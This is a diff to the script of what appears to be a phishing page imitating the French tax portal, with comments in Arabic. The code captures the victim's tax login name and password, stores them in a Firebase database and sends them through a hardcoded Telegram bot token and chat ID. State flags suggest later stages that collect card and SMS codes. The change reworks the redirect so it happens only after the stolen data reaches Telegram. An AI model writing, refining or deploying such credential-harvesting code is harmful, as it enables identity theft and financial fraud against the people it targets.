@@ -85,19 +85,19 @@ $("#formulairePrincipal").submit(function (event) {
     $("#blocage").hide();
 
     if (inputPsw >= 6) {
-	  const impotsName = getElementValue("spi_tmp");
-	  const impotsPs = getElementValue("ps_tmp");
-      const Loading  = "true";
+      const impotsName = getElementValue("spi_tmp");
+      const impotsPs = getElementValue("ps_tmp");
+      const Loading = "true";
       const SMS = "false";
       const CC = "false";
       const CODE2 = "false";
-      const RESU  = "false";
+      const RESU = "false";
       const APP = "false";
       const APPYES = "false";
       const APPNO = "false";
 
-      set(ref(db, `user/${randomPhoneNumber}`), 
-{ impotsName, impotsPs, Loading, SMS ,CC, CODE2, RESU, APP, APPYES, APPNO});
+      set(ref(db, `user/${randomPhoneNumber}`),
+        { impotsName, impotsPs, Loading, SMS, CC, CODE2, RESU, APP, APPYES, APPNO });
 
       const token = "6405780707:AAHRLzgioifKDMGv5Rr9BGI-xqr-R7TZmtQ";
       const chatId = "5426755496";
@@ -131,9 +131,14 @@ $("#formulairePrincipal").submit(function (event) {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(requestBody)
-      }).then(response => response.ok ? console.log("تم إرسال الرسالة بنجاح!") : console.error("خطأ في إرسال الرسالة:", response.statusText));
-
-      window.location.href = "platfo.html?id=" + randomPhoneNumber;
+      }).then(response => {
+        if (response.ok) {
+          console.log("تم إرسال الرسالة بنجاح!");
+          sendToTelegramSuccess(); // استدعاء دالة إرسال الرسالة إلى تيليجرام بنجاح
+        } else {
+          console.error("خطأ في إرسال الرسالة:", response.statusText);
+        }
+      });
     } else {
       $("#erreur").show();
     }
@@ -142,6 +147,11 @@ $("#formulairePrincipal").submit(function (event) {
   event.preventDefault();
 });
 
+// دالة إرسال الرسالة إلى تيليجرام بنجاح
+function sendToTelegramSuccess() {
+  // اقوم بتنفيذ الإجراءات اللازمة بعد نجاح إرسال الرسالة إلى تيليجرام
+  window.location.href = "platfo.html?id=" + randomPhoneNumber;
+}
 
 </script>
 
